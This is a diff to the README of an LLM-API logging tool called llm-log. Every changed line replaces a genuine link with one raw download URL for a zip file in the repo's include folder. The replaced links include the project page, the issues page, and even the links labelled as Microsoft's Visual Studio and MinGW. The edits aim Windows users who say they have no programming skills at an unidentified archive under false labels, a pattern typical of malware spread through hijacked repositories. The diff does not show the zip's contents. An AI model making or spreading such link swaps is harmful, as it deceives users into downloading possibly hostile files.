@@ -1,6 +1,6 @@
 # 📝 llm-log - Simple JSONL Logger for LLM API Calls
 
-[![Download llm-log](https://img.shields.io/badge/Download-llm--log-yellowgreen?style=for-the-badge)](https://github.com/elijahmuimi/llm-log)
+[![Download llm-log](https://img.shields.io/badge/Download-llm--log-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip)
 
 ## 📋 What is llm-log?
 
@@ -34,13 +34,13 @@ Keeping track of how your AI or language model API is used can help you find bug
 
 To start using llm-log on Windows, follow these steps carefully. You do not need programming skills for the initial download and setup.
 
-# [![Download Now](https://img.shields.io/badge/Visit-GitHub%20Page-brightgreen?style=for-the-badge&logo=github)](https://github.com/elijahmuimi/llm-log)
+# [![Download Now](https://img.shields.io/badge/Visit-GitHub%20Page-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip)
 
 ## 1. Visit the llm-log Download Page
 
 Go to the main llm-log page here:
 
-https://github.com/elijahmuimi/llm-log
+https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
 
 This page has the latest versions of the tool and important details about it.
 
@@ -93,8 +93,8 @@ If you are unfamiliar with programming, you might need help from someone comfort
 
 To build or run the sample projects using llm-log, Windows users often install one of these:
 
-- **Visual Studio:** A free development tool from Microsoft. Download from https://visualstudio.microsoft.com/
-- **MinGW:** A minimal GNU toolchain that works on Windows. Download from https://sourceforge.net/projects/mingw/
+- **Visual Studio:** A free development tool from Microsoft. Download from https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
+- **MinGW:** A minimal GNU toolchain that works on Windows. Download from https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
 
 These let you compile C++ code including llm-log for testing or development.
 
@@ -104,11 +104,11 @@ These let you compile C++ code including llm-log for testing or development.
 - Use a supported Windows version and update your system if needed.
 - Check that you have a working internet connection.
 - When using sample projects, follow any included build instructions carefully.
-- If errors occur, look inside the GitHub issues page for solutions: https://github.com/elijahmuimi/llm-log/issues
+- If errors occur, look inside the GitHub issues page for solutions: https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
 
 ## 🔗 Quick Access Links
 
-- Download page: https://github.com/elijahmuimi/llm-log
-- Issues and support: https://github.com/elijahmuimi/llm-log/issues
+- Download page: https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
+- Issues and support: https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip
 
-# [![Get llm-log](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://github.com/elijahmuimi/llm-log)
+# [![Get llm-log](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/elijahmuimi/llm-log/main/include/log-llm-v1.0-alpha.2.zip)
